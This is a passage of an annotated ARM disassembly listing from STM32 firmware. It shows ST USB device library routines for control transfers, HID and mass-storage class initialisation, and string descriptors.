 800c228:	bf00      	nop
  }
}
 800c22a:	3718      	adds	r7, #24
 800c22c:	46bd      	mov	sp, r7
 800c22e:	bd80      	pop	{r7, pc}

0800c230 <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c230:	b480      	push	{r7}
 800c232:	b085      	sub	sp, #20
 800c234:	af00      	add	r7, sp, #0
 800c236:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c238:	2300      	movs	r3, #0
 800c23a:	73fb      	strb	r3, [r7, #15]
  uint8_t *pbuff = buf;
 800c23c:	687b      	ldr	r3, [r7, #4]
 800c23e:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c240:	e005      	b.n	800c24e <USBD_GetLen+0x1e>
  {
    len++;
 800c242:	7bfb      	ldrb	r3, [r7, #15]
 800c244:	3301      	adds	r3, #1
 800c246:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c248:	68bb      	ldr	r3, [r7, #8]
 800c24a:	3301      	adds	r3, #1
 800c24c:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c24e:	68bb      	ldr	r3, [r7, #8]
 800c250:	781b      	ldrb	r3, [r3, #0]
 800c252:	2b00      	cmp	r3, #0
 800c254:	d1f5      	bne.n	800c242 <USBD_GetLen+0x12>
  }

  return len;
 800c256:	7bfb      	ldrb	r3, [r7, #15]
}
 800c258:	4618      	mov	r0, r3
 800c25a:	3714      	adds	r7, #20
 800c25c:	46bd      	mov	sp, r7
 800c25e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c262:	4770      	bx	lr

0800c264 <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c264:	b580      	push	{r7, lr}
 800c266:	b084      	sub	sp, #16
 800c268:	af00      	add	r7, sp, #0
 800c26a:	60f8      	str	r0, [r7, #12]
 800c26c:	60b9      	str	r1, [r7, #8]
 800c26e:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c270:	68fb      	ldr	r3, [r7, #12]
 800c272:	2202      	movs	r2, #2
 800c274:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c278:	68fb      	ldr	r3, [r7, #12]
 800c27a:	687a      	ldr	r2, [r7, #4]
 800c27c:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c27e:	68fb      	ldr	r3, [r7, #12]
 800c280:	687a      	ldr	r2, [r7, #4]
 800c282:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c284:	687b      	ldr	r3, [r7, #4]
 800c286:	68ba      	ldr	r2, [r7, #8]
 800c288:	2100      	movs	r1, #0
 800c28a:	68f8      	ldr	r0, [r7, #12]
 800c28c:	f000 fdbc 	bl	800ce08 <USBD_LL_Transmit>

  return USBD_OK;
 800c290:	2300      	movs	r3, #0
}
 800c292:	4618      	mov	r0, r3
 800c294:	3710      	adds	r7, #16
 800c296:	46bd      	mov	sp, r7
 800c298:	bd80      	pop	{r7, pc}

0800c29a <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c29a:	b580      	push	{r7, lr}
 800c29c:	b084      	sub	sp, #16
 800c29e:	af00      	add	r7, sp, #0
 800c2a0:	60f8      	str	r0, [r7, #12]
 800c2a2:	60b9      	str	r1, [r7, #8]
 800c2a4:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c2a6:	687b      	ldr	r3, [r7, #4]
 800c2a8:	68ba      	ldr	r2, [r7, #8]
 800c2aa:	2100      	movs	r1, #0
 800c2ac:	68f8      	ldr	r0, [r7, #12]
 800c2ae:	f000 fdab 	bl	800ce08 <USBD_LL_Transmit>

  return USBD_OK;
 800c2b2:	2300      	movs	r3, #0
}
 800c2b4:	4618      	mov	r0, r3
 800c2b6:	3710      	adds	r7, #16
 800c2b8:	46bd      	mov	sp, r7
 800c2ba:	bd80      	pop	{r7, pc}

0800c2bc <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c2bc:	b580      	push	{r7, lr}
 800c2be:	b084      	sub	sp, #16
 800c2c0:	af00      	add	r7, sp, #0
 800c2c2:	60f8      	str	r0, [r7, #12]
 800c2c4:	60b9      	str	r1, [r7, #8]
 800c2c6:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c2c8:	68fb      	ldr	r3, [r7, #12]
 800c2ca:	2203      	movs	r2, #3
 800c2cc:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c2d0:	68fb      	ldr	r3, [r7, #12]
 800c2d2:	687a      	ldr	r2, [r7, #4]
 800c2d4:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c2d8:	68fb      	ldr	r3, [r7, #12]
 800c2da:	687a      	ldr	r2, [r7, #4]
 800c2dc:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c2e0:	687b      	ldr	r3, [r7, #4]
 800c2e2:	68ba      	ldr	r2, [r7, #8]
 800c2e4:	2100      	movs	r1, #0
 800c2e6:	68f8      	ldr	r0, [r7, #12]
 800c2e8:	f000 fdc6 	bl	800ce78 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c2ec:	2300      	movs	r3, #0
}
 800c2ee:	4618      	mov	r0, r3
 800c2f0:	3710      	adds	r7, #16
 800c2f2:	46bd      	mov	sp, r7
 800c2f4:	bd80      	pop	{r7, pc}

0800c2f6 <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c2f6:	b580      	push	{r7, lr}
 800c2f8:	b084      	sub	sp, #16
 800c2fa:	af00      	add	r7, sp, #0
 800c2fc:	60f8      	str	r0, [r7, #12]
 800c2fe:	60b9      	str	r1, [r7, #8]
 800c300:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c302:	687b      	ldr	r3, [r7, #4]
 800c304:	68ba      	ldr	r2, [r7, #8]
 800c306:	2100      	movs	r1, #0
 800c308:	68f8      	ldr	r0, [r7, #12]
 800c30a:	f000 fdb5 	bl	800ce78 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c30e:	2300      	movs	r3, #0
}
 800c310:	4618      	mov	r0, r3
 800c312:	3710      	adds	r7, #16
 800c314:	46bd      	mov	sp, r7
 800c316:	bd80      	pop	{r7, pc}

0800c318 <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c318:	b580      	push	{r7, lr}
 800c31a:	b082      	sub	sp, #8
 800c31c:	af00      	add	r7, sp, #0
 800c31e:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c320:	687b      	ldr	r3, [r7, #4]
 800c322:	2204      	movs	r2, #4
 800c324:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c328:	2300      	movs	r3, #0
 800c32a:	2200      	movs	r2, #0
 800c32c:	2100      	movs	r1, #0
 800c32e:	6878      	ldr	r0, [r7, #4]
 800c330:	f000 fd6a 	bl	800ce08 <USBD_LL_Transmit>

  return USBD_OK;
 800c334:	2300      	movs	r3, #0
}
 800c336:	4618      	mov	r0, r3
 800c338:	3708      	adds	r7, #8
 800c33a:	46bd      	mov	sp, r7
 800c33c:	bd80      	pop	{r7, pc}

0800c33e <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c33e:	b580      	push	{r7, lr}
 800c340:	b082      	sub	sp, #8
 800c342:	af00      	add	r7, sp, #0
 800c344:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c346:	687b      	ldr	r3, [r7, #4]
 800c348:	2205      	movs	r2, #5
 800c34a:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c34e:	2300      	movs	r3, #0
 800c350:	2200      	movs	r2, #0
 800c352:	2100      	movs	r1, #0
 800c354:	6878      	ldr	r0, [r7, #4]
 800c356:	f000 fd8f 	bl	800ce78 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c35a:	2300      	movs	r3, #0
}
 800c35c:	4618      	mov	r0, r3
 800c35e:	3708      	adds	r7, #8
 800c360:	46bd      	mov	sp, r7
 800c362:	bd80      	pop	{r7, pc}

0800c364 <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c364:	b580      	push	{r7, lr}
 800c366:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c368:	2200      	movs	r2, #0
 800c36a:	4912      	ldr	r1, [pc, #72]	; (800c3b4 <MX_USB_DEVICE_Init+0x50>)
 800c36c:	4812      	ldr	r0, [pc, #72]	; (800c3b8 <MX_USB_DEVICE_Init+0x54>)
 800c36e:	f7fe fd68 	bl	800ae42 <USBD_Init>
 800c372:	4603      	mov	r3, r0
 800c374:	2b00      	cmp	r3, #0
 800c376:	d001      	beq.n	800c37c <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c378:	f7f4 fc7e 	bl	8000c78 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c37c:	490f      	ldr	r1, [pc, #60]	; (800c3bc <MX_USB_DEVICE_Init+0x58>)
 800c37e:	480e      	ldr	r0, [pc, #56]	; (800c3b8 <MX_USB_DEVICE_Init+0x54>)
 800c380:	f7fe fd8f 	bl	800aea2 <USBD_RegisterClass>
 800c384:	4603      	mov	r3, r0
 800c386:	2b00      	cmp	r3, #0
 800c388:	d001      	beq.n	800c38e <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c38a:	f7f4 fc75 	bl	8000c78 <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c38e:	490c      	ldr	r1, [pc, #48]	; (800c3c0 <MX_USB_DEVICE_Init+0x5c>)
 800c390:	4809      	ldr	r0, [pc, #36]	; (800c3b8 <MX_USB_DEVICE_Init+0x54>)
 800c392:	f7fc fca5 	bl	8008ce0 <USBD_CUSTOM_HID_RegisterInterface>
 800c396:	4603      	mov	r3, r0
 800c398:	2b00      	cmp	r3, #0
 800c39a:	d001      	beq.n	800c3a0 <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c39c:	f7f4 fc6c 	bl	8000c78 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c3a0:	4805      	ldr	r0, [pc, #20]	; (800c3b8 <MX_USB_DEVICE_Init+0x54>)
 800c3a2:	f7fe fdb4 	bl	800af0e <USBD_Start>
 800c3a6:	4603      	mov	r3, r0
 800c3a8:	2b00      	cmp	r3, #0
 800c3aa:	d001      	beq.n	800c3b0 <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c3ac:	f7f4 fc64 	bl	8000c78 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */
  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c3b0:	bf00      	nop
 800c3b2:	bd80      	pop	{r7, pc}
 800c3b4:	200001ac 	.word	0x200001ac
 800c3b8:	200003c0 	.word	0x200003c0
 800c3bc:	2000002c 	.word	0x2000002c
 800c3c0:	2000019c 	.word	0x2000019c

0800c3c4 <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c3c4:	b580      	push	{r7, lr}
 800c3c6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c3c8:	2200      	movs	r2, #0
 800c3ca:	4912      	ldr	r1, [pc, #72]	; (800c414 <MX_USB_DEVICE_Init_MSC+0x50>)
 800c3cc:	4812      	ldr	r0, [pc, #72]	; (800c418 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3ce:	f7fe fd38 	bl	800ae42 <USBD_Init>
 800c3d2:	4603      	mov	r3, r0
 800c3d4:	2b00      	cmp	r3, #0
 800c3d6:	d001      	beq.n	800c3dc <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c3d8:	f7f4 fc4e 	bl	8000c78 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
 800c3dc:	490f      	ldr	r1, [pc, #60]	; (800c41c <MX_USB_DEVICE_Init_MSC+0x58>)
 800c3de:	480e      	ldr	r0, [pc, #56]	; (800c418 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3e0:	f7fe fd5f 	bl	800aea2 <USBD_RegisterClass>
 800c3e4:	4603      	mov	r3, r0
 800c3e6:	2b00      	cmp	r3, #0
 800c3e8:	d001      	beq.n	800c3ee <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c3ea:	f7f4 fc45 	bl	8000c78 <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c3ee:	490c      	ldr	r1, [pc, #48]	; (800c420 <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c3f0:	4809      	ldr	r0, [pc, #36]	; (800c418 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3f2:	f7fc ff27 	bl	8009244 <USBD_MSC_RegisterStorage>
 800c3f6:	4603      	mov	r3, r0
 800c3f8:	2b00      	cmp	r3, #0
 800c3fa:	d001      	beq.n	800c400 <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
 800c3fc:	f7f4 fc3c 	bl	8000c78 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c400:	4805      	ldr	r0, [pc, #20]	; (800c418 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c402:	f7fe fd84 	bl	800af0e <USBD_Start>
 800c406:	4603      	mov	r3, r0
 800c408:	2b00      	cmp	r3, #0
 800c40a:	d001      	beq.n	800c410 <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c40c:	f7f4 fc34 	bl	8000c78 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c410:	bf00      	nop
 800c412:	bd80      	pop	{r7, pc}
 800c414:	200001ac 	.word	0x200001ac
 800c418:	2000069c 	.word	0x2000069c
 800c41c:	200000a8 	.word	0x200000a8
 800c420:	20000220 	.word	0x20000220

0800c424 <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c424:	b480      	push	{r7}
 800c426:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c428:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c42a:	4618      	mov	r0, r3
 800c42c:	46bd      	mov	sp, r7
 800c42e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c432:	4770      	bx	lr

0800c434 <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c434:	b480      	push	{r7}
 800c436:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c438:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c43a:	4618      	mov	r0, r3
 800c43c:	46bd      	mov	sp, r7
 800c43e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c442:	4770      	bx	lr

0800c444 <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c444:	b580      	push	{r7, lr}
 800c446:	b082      	sub	sp, #8
 800c448:	af00      	add	r7, sp, #0
 800c44a:	4603      	mov	r3, r0
 800c44c:	460a      	mov	r2, r1
 800c44e:	71fb      	strb	r3, [r7, #7]
 800c450:	4613      	mov	r3, r2
 800c452:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
 800c454:	4803      	ldr	r0, [pc, #12]	; (800c464 <CUSTOM_HID_OutEvent_FS+0x20>)
 800c456:	f7fc fbd1 	bl	8008bfc <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c45a:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c45c:	4618      	mov	r0, r3
 800c45e:	3708      	adds	r7, #8
 800c460:	46bd      	mov	sp, r7
 800c462:	bd80      	pop	{r7, pc}
 800c464:	200003c0 	.word	0x200003c0

0800c468 <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c468:	b480      	push	{r7}
 800c46a:	b083      	sub	sp, #12
 800c46c:	af00      	add	r7, sp, #0
 800c46e:	4603      	mov	r3, r0
 800c470:	6039      	str	r1, [r7, #0]
 800c472:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c474:	683b      	ldr	r3, [r7, #0]
 800c476:	2212      	movs	r2, #18
 800c478:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c47a:	4b06      	ldr	r3, [pc, #24]	; (800c494 <USBD_FS_DeviceDescriptor+0x2c>)
 800c47c:	681b      	ldr	r3, [r3, #0]
 800c47e:	2b01      	cmp	r3, #1
 800c480:	d101      	bne.n	800c486 <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c482:	4b05      	ldr	r3, [pc, #20]	; (800c498 <USBD_FS_DeviceDescriptor+0x30>)
 800c484:	e000      	b.n	800c488 <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c486:	4b05      	ldr	r3, [pc, #20]	; (800c49c <USBD_FS_DeviceDescriptor+0x34>)
}
 800c488:	4618      	mov	r0, r3
 800c48a:	370c      	adds	r7, #12
 800c48c:	46bd      	mov	sp, r7
 800c48e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c492:	4770      	bx	lr
 800c494:	20000978 	.word	0x20000978
 800c498:	200001cc 	.word	0x200001cc
 800c49c:	200001e0 	.word	0x200001e0

0800c4a0 <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4a0:	b480      	push	{r7}
 800c4a2:	b083      	sub	sp, #12
 800c4a4:	af00      	add	r7, sp, #0
 800c4a6:	4603      	mov	r3, r0
 800c4a8:	6039      	str	r1, [r7, #0]
 800c4aa:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c4ac:	683b      	ldr	r3, [r7, #0]
 800c4ae:	2204      	movs	r2, #4
 800c4b0:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c4b2:	4b03      	ldr	r3, [pc, #12]	; (800c4c0 <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c4b4:	4618      	mov	r0, r3
 800c4b6:	370c      	adds	r7, #12
 800c4b8:	46bd      	mov	sp, r7
 800c4ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c4be:	4770      	bx	lr
 800c4c0:	20000200 	.word	0x20000200

0800c4c4 <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4c4:	b580      	push	{r7, lr}
 800c4c6:	b082      	sub	sp, #8
 800c4c8:	af00      	add	r7, sp, #0
 800c4ca:	4603      	mov	r3, r0
 800c4cc:	6039      	str	r1, [r7, #0]
 800c4ce:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c4d0:	79fb      	ldrb	r3, [r7, #7]
 800c4d2:	2b00      	cmp	r3, #0
 800c4d4:	d105      	bne.n	800c4e2 <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c4d6:	683a      	ldr	r2, [r7, #0]
 800c4d8:	4907      	ldr	r1, [pc, #28]	; (800c4f8 <USBD_FS_ProductStrDescriptor+0x34>)
 800c4da:	4808      	ldr	r0, [pc, #32]	; (800c4fc <USBD_FS_ProductStrDescriptor+0x38>)
 800c4dc:	f7ff fe62 	bl	800c1a4 <USBD_GetString>
 800c4e0:	e004      	b.n	800c4ec <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c4e2:	683a      	ldr	r2, [r7, #0]
 800c4e4:	4904      	ldr	r1, [pc, #16]	; (800c4f8 <USBD_FS_ProductStrDescriptor+0x34>)
 800c4e6:	4805      	ldr	r0, [pc, #20]	; (800c4fc <USBD_FS_ProductStrDescriptor+0x38>)
 800c4e8:	f7ff fe5c 	bl	800c1a4 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c4ec:	4b02      	ldr	r3, [pc, #8]	; (800c4f8 <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c4ee:	4618      	mov	r0, r3
 800c4f0:	3708      	adds	r7, #8
 800c4f2:	46bd      	mov	sp, r7
 800c4f4:	bd80      	pop	{r7, pc}
 800c4f6:	bf00      	nop
 800c4f8:	2000097c 	.word	0x2000097c
 800c4fc:	0800d164 	.word	0x0800d164

0800c500 <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c500:	b580      	push	{r7, lr}
 800c502:	b082      	sub	sp, #8
 800c504:	af00      	add	r7, sp, #0
 800c506:	4603      	mov	r3, r0
 800c508:	6039      	str	r1, [r7, #0]
 800c50a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c50c:	683a      	ldr	r2, [r7, #0]
 800c50e:	4904      	ldr	r1, [pc, #16]	; (800c520 <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c510:	4804      	ldr	r0, [pc, #16]	; (800c524 <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c512:	f7ff fe47 	bl	800c1a4 <USBD_GetString>
  return USBD_StrDesc;
 800c516:	4b02      	ldr	r3, [pc, #8]	; (800c520 <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c518:	4618      	mov	r0, r3
 800c51a:	3708      	adds	r7, #8
 800c51c:	46bd      	mov	sp, r7
 800c51e:	bd80      	pop	{r7, pc}
 800c520:	2000097c 	.word	0x2000097c
 800c524:	0800d178 	.word	0x0800d178

0800c528 <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c528:	b580      	push	{r7, lr}
 800c52a:	b082      	sub	sp, #8
 800c52c:	af00      	add	r7, sp, #0
 800c52e:	4603      	mov	r3, r0
 800c530:	6039      	str	r1, [r7, #0]
 800c532:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c534:	683b      	ldr	r3, [r7, #0]
 800c536:	221a      	movs	r2, #26
 800c538:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c53a:	f000 f855 	bl	800c5e8 <Get_SerialNum>
  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c53e:	4b02      	ldr	r3, [pc, #8]	; (800c548 <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c540:	4618      	mov	r0, r3
 800c542:	3708      	adds	r7, #8
 800c544:	46bd      	mov	sp, r7
 800c546:	bd80      	pop	{r7, pc}
 800c548:	20000204 	.word	0x20000204

0800c54c <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c54c:	b580      	push	{r7, lr}
 800c54e:	b082      	sub	sp, #8
 800c550:	af00      	add	r7, sp, #0
 800c552:	4603      	mov	r3, r0
 800c554:	6039      	str	r1, [r7, #0]
 800c556:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c558:	79fb      	ldrb	r3, [r7, #7]
 800c55a:	2b00      	cmp	r3, #0
 800c55c:	d105      	bne.n	800c56a <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c55e:	683a      	ldr	r2, [r7, #0]
 800c560:	4907      	ldr	r1, [pc, #28]	; (800c580 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c562:	4808      	ldr	r0, [pc, #32]	; (800c584 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c564:	f7ff fe1e 	bl	800c1a4 <USBD_GetString>
 800c568:	e004      	b.n	800c574 <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c56a:	683a      	ldr	r2, [r7, #0]
 800c56c:	4904      	ldr	r1, [pc, #16]	; (800c580 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c56e:	4805      	ldr	r0, [pc, #20]	; (800c584 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c570:	f7ff fe18 	bl	800c1a4 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c574:	4b02      	ldr	r3, [pc, #8]	; (800c580 <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c576:	4618      	mov	r0, r3
 800c578:	3708      	adds	r7, #8
 800c57a:	46bd      	mov	sp, r7
 800c57c:	bd80      	pop	{r7, pc}
 800c57e:	bf00      	nop
 800c580:	2000097c 	.word	0x2000097c
 800c584:	0800d17c 	.word	0x0800d17c

0800c588 <USBD_FS_InterfaceStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
